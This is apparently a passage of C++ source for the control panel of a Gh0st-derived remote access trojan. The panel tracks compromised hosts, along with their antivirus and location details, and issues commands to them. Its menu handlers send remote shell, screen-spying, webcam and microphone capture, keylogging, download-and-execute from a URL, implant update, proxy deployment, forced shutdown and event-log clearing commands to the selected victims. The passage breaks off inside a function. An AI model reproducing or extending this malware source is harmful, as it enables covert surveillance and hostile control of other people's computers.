		// 			 strToolTipsText += _T("\nAlien ET : ");
// 			 strToolTipsText += m_QQwry->IPtoAdd(IPAddress);
		SYSTEMTIME sys;   
		GetLocalTime( &sys );
		str.Format( "%02d:%02d %02d/%02d"  
			,sys.wHour,sys.wMinute
			,sys.wMonth,sys.wDay   
			);  

//		m_pListCtrl->SetItemText(i, 11, LoginInfo->szRunTime);

		m_pListCtrl->SetItemText(i, 11, LoginInfo->szInstallTime);

		m_pListCtrl->SetItemText(i, 12, LoginInfo->szAntivirus);

		//m_pListCtrl->SetItemText(i, 12, str);
		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			str=m_QQwry->IPtoAdd(IPAddress);
		//	strLogText.Format( "主机上线 IP: [%s]   系统: [%s]   版本: [%s]   地理位置: [%s]",IPAddress,strOS,LoginInfo->szQQNum,str);
			// 新上线主机信息
	//		g_pLogView->InsertLogItem(strLogText, 0, 0);
			strToolTipsText.Format("主机名   : %s\n视频     : %s\n外网IP   : %s\n系统     : %s\n杀毒     : %s\n区域     : %s", 
				LoginInfo->HostName, m_pListCtrl->GetItemText( i,8 ), IPAddress, strOS, LoginInfo->szAntivirus,str);
		}
		
		
		else
		{
			
			str = "未找到IP数据库";
	//		strLogText.Format( "主机上线 IP: [%s]   系统: [%s]   版本: [%s]",IPAddress,strOS,LoginInfo->szAntivirus);
	//		g_pLogView->InsertLogItem(strLogText, 0, 0);
			// 新上线主机信息
			strToolTipsText.Format("主机名   : %s\n视频     : %s\n外网IP   : %s\n系统     : %s\n杀毒     : %s", 
				LoginInfo->HostName, m_pListCtrl->GetItemText( i,8 ), IPAddress, strOS, LoginInfo->szAntivirus);
		}
	//	m_pListCtrl->SetItemText(i, 13, str);

		

		// 指定唯一标识
		m_pListCtrl->SetItemData(i, (DWORD) pContext);

		if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);

		CString strToolTipsText0;

		strToolTipsText0.Format(_T("主机上线:[%s/%s] -> 分组:[%s] -> 区域:[%s]"), 
			m_pListCtrl->GetItemText(i, 2),  //外网IP
			m_pListCtrl->GetItemText(i, 3),  //内网IP 
			LoginInfo->UpGroup, //上线分组
		    m_pListCtrl->GetItemText(i, 0));

		g_pLogView->InsertLogItem( strToolTipsText0, 0, 1 );

		// 赋值
		lstrcpy(pContext->szOnlinePass,LoginInfo->szOnlinePass);

		if (!((CGh0stApp *)AfxGetApp())->m_bIsWarning_Tone)
		{
			PlaySound(MAKEINTRESOURCE(IDR_WAVE_LOGIN),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		}

		////////////////////////////////////////重复上线问题////////////////////////////////////////////////
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ ){
			if( m_pListCtrl->GetItemText( nCnt , 2 ) == m_pListCtrl->GetItemText( Tmpi , 2 )){//先判断外网IP
				if( m_pListCtrl->GetItemText( nCnt , 3 ) == m_pListCtrl->GetItemText( Tmpi , 3 )){//再判断内网IP
				//	Suanxinglianjxianshi(m_pListCtrl->GetItemText( Tmpi, 5 ),Tmpi);
					CString strOSCount;
					strOSCount = m_pListCtrl->GetItemText( i, 5 );
					if ( strOSCount.Find(_T("XP")) != -1 )
					{
						g_pFrame->nOSCount[2]--;
					}else if ( strOSCount.Find(_T("7")) != -1 )
					{
						g_pFrame->nOSCount[6]--;
					}else if ( strOSCount.Find(_T("2003")) != -1 )
					{
						g_pFrame->nOSCount[3]--;
					}else if ( strOSCount.Find(_T("8")) != -1 )
					{
						g_pFrame->nOSCount[7]--;
					}else if ( strOSCount.Find(_T("2008")) != -1 )
					{
						g_pFrame->nOSCount[5]--;
					}else if ( strOSCount.Find(_T("Vista")) != -1 )
					{
						g_pFrame->nOSCount[4]--;
					}else if ( strOSCount.Find(_T("2012")) != -1 )
					{
						g_pFrame->nOSCount[8]--;
					}else if ( strOSCount.Find(_T("2000")) != -1 )
					{
						g_pFrame->nOSCount[1]--;
					}else if ( strOSCount.Find(_T("NT")) != -1 )
					{
						g_pFrame->nOSCount[0]--;
					}else if ( strOSCount.Find(_T("10")) != -1)
					{
						g_pFrame->nOSCount[9]--;
					}
					else if ( strOSCount.Find(_T("2016")) != -1)
					{
						g_pFrame->nOSCount[8]--;
					}
					m_pListCtrl->DeleteItem(Tmpi);	
					
				}
			}
		}
		
		

    	g_pTabView->UpDateNumber();
		g_pFrame->ShowConnectionsNumber();

		

	}
	catch(...)
	{
		TRACE("\r\n\r\n\r\n\r\n添加失败--------------------------------------");
 		m_pListCtrl->DeleteItem(i);
	}
	return 0;
}


void CPcView::SendSelectCommand(PBYTE pData, UINT nSize)
{       

	BOOL Stpd = FALSE;
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nSize);
	memcpy(lpBuffer, pData, nSize);
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	//获取通讯连接密码
	CUpdateDlg Dig;
	CString Mistr1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings","ConnectPass","");
	CString Mistr2 = Dig.Base64Decode(Mistr1);//数据解密
	CString Mistr3 = Dig.Base64Decode(Mistr2);     //数据2次解密
	CString strPass = Mistr3;

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		if (0 ==lstrcmp(pContext->szOnlinePass,strPass.GetBuffer(0)))
		{
			// 发送获得驱动器列表数据包
			m_iocpServer->Send(pContext, pData, nSize,FALSE);
			Stpd = TRUE;

		}else
		{
			g_pLogView->InsertLogItem("连接密码错误,您没有权限控制此机器!",0,2);
		}
		

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
	if(Stpd)
	{
		LocalFree(lpBuffer);
		return ;
	}

	//勾选复选框选中主机
	INT Count =m_pListCtrl->GetItemCount();
	for (int i=0;i<Count;i++)
	{
		if(m_pListCtrl->GetCheck(i))
		{
			ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
			// 发送获得驱动器列表数据包
			m_iocpServer->Send(pContext,(unsigned char *)lpBuffer, nSize, NULL);
		}
	}
	LocalFree(lpBuffer);
}

void CPcView::OnMenuitemChangeGroup() 
{
	// TODO: Add your command handler code here
	CChangeGroupDlg m_group;
	if ( m_group.DoModal() == IDOK )
	{	
		OutputDebugString("进入...修改分组");
		int	nPacketLength = m_group.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
		
		CString strTemp, strGroupName;
		CPcView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( _T("%s(0)"), m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
			pView->OnInitialUpdate();
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);


			CString	str;
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));
			int nCnt = pView->m_pListCtrl->GetItemCount();
//			str.Format("%d",pView->m_nCount++);
			int i = 0;


//			CString str1=m_pListCtrl->GetItemText(m, 12);
			CString str1=m_pListCtrl->GetItemText(m, 0);

			int countryno=FindCountry(str1);

			i = pView->m_pListCtrl->InsertItem(nCnt, str1,countryno );

			
			for(int a =1;a<g_Column_Count;a++)
		    	pView->m_pListCtrl->SetItemText(i, a, m_pListCtrl->GetItemText(m, a));			
						
			// 指定唯一标识
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			
			g_pTabView->UpDateNumber();
			//g_pFrame->ShowConnectionsNumber();
		}
	}
}

void CPcView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	SetSortImage(m_nSortedCol, m_bAscending);
	CXTPSortClass csc(m_pListCtrl, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}

#define ID_FIRST1 0
BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
/*
		HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
		if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
		{
			SortColumn(pHDNotify->iItem, !m_bAscending);
		}
		
		if ((((LPNMHDR)lParam)->code == NM_RCLICK))  
	    {
			CMenu menu;
			menu.CreatePopupMenu();
			
			LVCOLUMN lvcol;
			char str[256];
			int nColNum = 0;
			CString strColumnName[20];//假如有255列
			
			lvcol.mask = LVCF_TEXT;
			lvcol.pszText = str;
			lvcol.cchTextMax = 256;
			while(m_pListCtrl->GetColumn(nColNum, &lvcol))
			{ 
				strColumnName[nColNum] = lvcol.pszText;
				menu.AppendMenu(MF_STRING,ID_FIRST1 + nColNum,strColumnName[nColNum]);
				
				menu.CheckMenuItem(ID_FIRST1 + nColNum, (m_pListCtrl->GetColumnWidth(nColNum) == 0) ? MF_UNCHECKED : MF_CHECKED);
				
				nColNum++;
			}
			
			CPoint	p;
			GetCursorPos(&p);
			menu.TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	    }  
	
		
		return CXTPListView::OnNotify(wParam, lParam, pResult);*/
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	
	if ((((LPNMHDR)lParam)->code == NM_RCLICK))  
    {
		CMenu menu;
		menu.CreatePopupMenu();
		
		LVCOLUMN lvcol;
		char str[256];
		int nColNum = 0;
		CString strColumnName[20];//假如有255列
		
		lvcol.mask = LVCF_TEXT;
		lvcol.pszText = str;
		lvcol.cchTextMax = 256;
		while(m_pListCtrl->GetColumn(nColNum, &lvcol))
		{ 
			strColumnName[nColNum] = lvcol.pszText;
			menu.AppendMenu(MF_STRING,ID_FIRST1 + nColNum,strColumnName[nColNum]);
			
			menu.CheckMenuItem(ID_FIRST1 + nColNum, (m_pListCtrl->GetColumnWidth(nColNum) == 0) ? MF_UNCHECKED : MF_CHECKED);
			
			nColNum++;
		}
		
		CPoint	p;
		GetCursorPos(&p);
		CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN|TPM_RIGHTBUTTON,p.x,p.y,this);
		//		menu.TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
		menu.DestroyMenu();

	}  
	
	return CXTPListView::OnNotify(wParam, lParam, pResult);
}

//=======================================================================================

void CPcView::OnMenuitemFilemanager() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpFilePacket , nFilePacketLength );
}

void CPcView::OnMenuitemRemoteshell() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpShellPacket , nShellPacketLength  );
}

void CPcView::OnMenuitemScreenspy() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpScreenPacket , nScreenPacketLength );
}

void CPcView::OnMenuitemWebcam() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpWebCamPacket , nWebCamPacketLength );
}

void CPcView::OnMenuitemAudioListen() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpAudioPacket , nAudioPacketLength );
}

void CPcView::OnMenuitemSystem() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpSystemPacket , nSystemPacketLength );
}

void CPcView::OnMenuitemKeyboard()   //键盘记录
{
	// TODO: Add your command handler code here
//	SendSelectCommand(lpKeyboardPacket , nKeyboardPacketLength );
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnChat() //剪切板
{
	// TODO: Add your command handler code here
	
	BYTE	bToken = COMMAND_CHAT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnMenuitemServicemanager() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpServicePacket , nServicePacketLength );
}

void CPcView::OnMenuitemRegedit() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpRegeditPacket , nRegeditPacketLength );
}

void CPcView::OnMenuitemTextChat() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpTextChatPacket , nTextChatPacketLength );
}

void CPcView::OnMenuitemProxyMap() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpProxyMapPacket , nProxyPacketLength );
}


//=======================================================================================

COLORREF   m_crTextBk , m_clrText; 
void CPcView::OnCustomDraw(NMHDR* pNMHDR, LRESULT* pResult) 
{ 
	
	NMLVCUSTOMDRAW* pLVCD = (NMLVCUSTOMDRAW*)(pNMHDR); 
	*pResult = CDRF_NEWFONT; 
	if ( pLVCD->nmcd.dwDrawStage==CDDS_PREPAINT) 
	{ 
		*pResult = CDRF_NOTIFYITEMDRAW; 
	} 
	else if ( pLVCD->nmcd.dwDrawStage == CDDS_ITEMPREPAINT )  
	{
		
		int nItem = static_cast<int> (pLVCD->nmcd.dwItemSpec); 	
		CString str = m_pListCtrl->GetItemText(nItem ,12); 
		CString szColor = m_pListCtrl->GetItemText(nItem ,13); 
		bool bDBImplFail = false;
		if (str.Find(_T("Yes")) == 0)
		{ 
			m_clrText  =  RGB(255, 0, 0) ; // 红色
		} 
		else 
		{
			m_clrText  =  RGB(0,100,255);//蓝色
		} 
		if (szColor.Find(_T("Red")) == 0)
		{ 
			m_clrText  =  RGB(255, 0, 0) ; // 红色
		}
		if (szColor.Find(_T("Blank")) == 0)
		{ 
			m_clrText  =  RGB(0, 0, 0) ; // 黄色
		}
		if (szColor.Find(_T("Green")) == 0)
		{ 
			m_clrText  =  RGB(0, 255, 0) ; // 绿色
		}
		if (szColor.Find(_T("Purple")) == 0)
		{ 
			m_clrText  =  RGB(160, 32, 240) ; // 紫色
		}
		
		
		pLVCD->clrText = m_clrText; 	
		*pResult = CDRF_DODEFAULT; 
	} 
}

/*
void CPcView::OnSetcolor() 
{
	// TODO: Add your command handler code here
	CSetColor m_dlgColor;
	BOOL bItem=FALSE;
	
	COLORREF m_Color;
	TCHAR szColor[16];
	ZeroMemory(szColor,16);
	if ( m_dlgColor.DoModal() == IDOK )
	{
		
		switch(m_dlgColor.nSecletIndex)
		{
		case 0:
			lstrcpy(szColor,_T("Blank"));
			m_Color = RGB(0, 0, 0);
			
			break;
		case 1:
			lstrcpy(szColor,_T("Red"));
			m_Color = RGB(255, 0, 0);
			break;
		case 2:
			lstrcpy(szColor,_T("Green"));
			m_Color = RGB(0,255,0);
			
			break;
		case 3:
			lstrcpy(szColor,_T("Purple"));
			m_Color = RGB(85, 26,139);
			break;
		default:
			break;
		}
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
		if (pos==NULL)
			return;
		while(pos)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			m_pListCtrl->SetItemText( nItem, 13, szColor);
		}
		
		
		LPBYTE	lpPacket = new BYTE[strlen(szColor) + 1];
		ZeroMemory(lpPacket,strlen(szColor) + 1);			
		lpPacket[0] = COMMAND_CLORE;
		memcpy(lpPacket + 1, szColor, strlen(szColor));	
		SendSelectCommand(lpPacket, strlen(szColor) + 1);
		delete[] lpPacket;
		
	}
}
 */
void CPcView::OnMenuitemReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnMenuitemShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnMenuitemLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}


void CPcView::OnMenuitemSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,TRUE);
	}
}

void CPcView::OnMenuitemUninstall() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("确认卸载服务端吗 -:)"), _T("Warning"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_UNINSTALL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnMenuitemRemark() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
		return ;	
	
	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format(_T("更改主机(%s)的备注"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle.Format("已选择(%d)台主机 批量更改主机备注",m_pListCtrl->GetSelectedCount());
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 4, dlg.m_str);
	}
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 远程访问网址",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("请输入要显示访问的网址:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemOpenUrlHide() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 远程访问网址",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("请输入要显示访问的网址:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,FALSE);
	}
}



void CPcView::OnMenuitemDownexec() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 下载者",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("请输入要下载文件的地址:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemLocalUpload() 
{
	// TODO: Add your command handler code here
	CLocalUpload dlg;
	dlg.DoModal();
}

void CPcView::OnMenuitemFindProcess() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString str;
	str.Format("已选择(%d)台主机 查找进程(找到的在机器名前显示*号)",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("请输入要查找的进程名(例如qq.exe):"), this);
	if (dlg.DoModal() == IDOK)
	{
		int		nPacketLength = dlg.m_str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_FIND_PROCESS;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}

void CPcView::OnMenuitemFindWindow() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString str;
	str.Format("已选择(%d)台主机 查找窗口(找到的在机器名前显示*号)",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("请输入要查找的窗口标题包含的文字:"), this);
	if (dlg.DoModal() == IDOK)
	{
		int		nPacketLength = dlg.m_str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_FIND_WINDOW;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}
 


void CPcView::OnMenuitemCleanFind() 
{
	// TODO: Add your command handler code here
	int nCount = m_pListCtrl->GetItemCount();
	
	for (int i=0; i < nCount; i++)
	{
		CString str;
		str = 	m_pListCtrl->GetItemText(i, 3);
		int n = str.Find('*');
		if (n == 0)
			str = str.Right(str.GetLength() - 1);
		else
			continue;
		m_pListCtrl->SetItemText(i, 3, str);
	}
}

void CPcView::OnMenuitemCopyIp() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 1);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	CSystemDlg::SetClipboardText(Data);
	MessageBox("主机IP已复制到剪切板");
}

void CPcView::OnMenuitemCopyAll() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		Name = "";
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		for(int i = 0; i < m_pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
		{
			Name += m_pListCtrl->GetItemText(nItem, i);
			Name += "	";
		}
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	CSystemDlg::SetClipboardText(Data);	
	MessageBox("主机信息已复制到剪切板");
}

void CPcView::OnMenuitemUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 下载更新服务端",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("输入的网址不合法"), _T("错误"));
		return;
	}
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_UPDATE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}




BOOL CPcView::OnCommand(WPARAM wParam, LPARAM lParam) 
{
	// TODO: Add your specialized code here and/or call the base class

	int menuID = LOWORD(wParam) - ID_FIRST1;
	
	CString str;
	str.Format("Width%d",menuID);
	
	if(m_pListCtrl->GetColumnWidth(menuID) == 0)
		m_pListCtrl->SetColumnWidth(menuID,g_Column_Data[menuID].nWidth);
	else
		m_pListCtrl->SetColumnWidth(menuID,0);
	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("MainHeader_Column_Width", str, m_pListCtrl->GetColumnWidth(menuID));
	
	return CXTPListView::OnCommand(wParam, lParam);
}


#include "MsgBoxDlg.h"
void CPcView::OnMenuitemMessagebox() 
{
	// TODO: Add your command handler code here
	struct MSGBOX
	{
		CHAR Title[200];
		CHAR szText[1000];
		UINT Type;
}MsgBox;

	CMsgBoxDlg dlg;
SHOW:
	if(dlg.DoModal() != IDOK) 
		return;

	if (strlen(dlg.m_edit_caption)<1 || strlen(dlg.m_edit_text) < 1)
	{
		MessageBox("请输入发送标题及内容!!... ", "提示! ", MB_OK | MB_ICONWARNING);
		goto SHOW;
	}

	ZeroMemory(&MsgBox,sizeof(MSGBOX));
	strcpy(MsgBox.Title,dlg.m_edit_caption.GetBuffer(0));
	strcpy(MsgBox.szText,dlg.m_edit_text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton|dlg.m_msgIcon;
	
	BYTE	*bToken = new BYTE[sizeof(MSGBOX)+1];
	bToken[0]= COMMAND_MESSAGEBOX;
	memcpy(&bToken[1],&MsgBox,sizeof(MSGBOX));
	
	SendSelectCommand(bToken, sizeof(MSGBOX)+1);
	delete bToken;
	goto SHOW;
}

void CPcView::OnMenuitemSaveIplist() 
{
	// TODO: Add your command handler code here
	CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("文本文件|*.txt"), NULL);
    if (dlg.DoModal() != IDOK)
		return;
	
	CFile file;
	if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	{
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		while (pos)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			CString strTitle;
			strTitle.Format(_T("%s\r\n"), m_pListCtrl->GetItemText(nItem, 1));
			file.Write(strTitle, strlen(strTitle));
		}
		file.Close();
		AfxMessageBox(_T("IP列表导出成功!"));
	}
}

#include "..\Bin\Plugins\C_PROXY.h"
void CPcView::OnMenuitemProxy() 
{
	// TODO: Add your command handler code here
	COpenProxy dlg;	

	int nRet = dlg.DoModal();
	if(nRet == IDOK) 
	{
		char szToken[99];
		memset(szToken,0,sizeof(szToken));
		// 如果需要验证
		if (dlg.m_check_verify)
		{
			if (dlg.m_edit_user.IsEmpty() || dlg.m_edit_pass.IsEmpty())
			{
				AfxMessageBox("信息不完整！");
				return;
			}
			wsprintf(szToken,"%d|%s|%s",dlg.m_edit_port,dlg.m_edit_user,dlg.m_edit_pass);
		}
		else
			wsprintf(szToken,"%d",dlg.m_edit_port);
		
		
		int nPacketLength = 100 + PROXYMyFileSize;
		LPBYTE lpPacket = new BYTE[nPacketLength];
		if(lpPacket == NULL)			return;
		lpPacket[0] = COMMAND_OPEN_PROXY;
		memcpy(lpPacket + 1, szToken, 99);
		memcpy(lpPacket + 100,PROXYMyFileBuf,PROXYMyFileSize);
		
    	SendSelectCommand(lpPacket, nPacketLength);
		delete [] lpPacket; 
	}
	else if (nRet == IDNO)
	{
		BYTE bToken = COMMAND_CLOSE_PROXY;
		SendSelectCommand(&bToken,sizeof(bToken));
	}
} 
  
void CPcView::OnMenuitemPrank() 
{
	// TODO: Add your command handler code here
	CPrankDlg dlg;
	dlg.DoModal();
}

void CPcView::OnMenuitemCleaneventAll() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
